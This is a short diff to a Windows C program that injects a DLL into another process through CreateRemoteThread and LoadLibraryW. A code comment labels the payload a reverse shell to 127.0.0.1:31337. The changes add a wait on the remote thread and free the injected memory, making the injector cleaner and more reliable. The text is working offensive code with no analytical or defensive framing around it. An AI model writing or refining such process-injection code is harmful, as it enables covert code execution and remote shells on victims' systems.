@@ -11,6 +11,7 @@
 int main(int argc, char *argv[]) {
     HANDLE processHandle;
     PVOID remoteBuffer;
+    PVOID remoteThread;
     DWORD pid;
 
     // Reverse shell to 127.0.0.1:31337
@@ -35,8 +36,10 @@ int main(int argc, char *argv[]) {
     printf("Wrote memory  : %d\n", temp);
     PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
     printf("Thread address: %p\n", threadStartRoutineAddress);
-    PVOID temp2 = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
-    printf("Remote address: %p\n", temp2);
+    remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
+    printf("Remote address: %p\n", remoteThread);
+    WaitForSingleObject(remoteThread, INFINITE);
+    VirtualFreeEx(processHandle, remoteBuffer, sizeof dllPath, MEM_RELEASE);
     CloseHandle(processHandle);
 
     return 0;
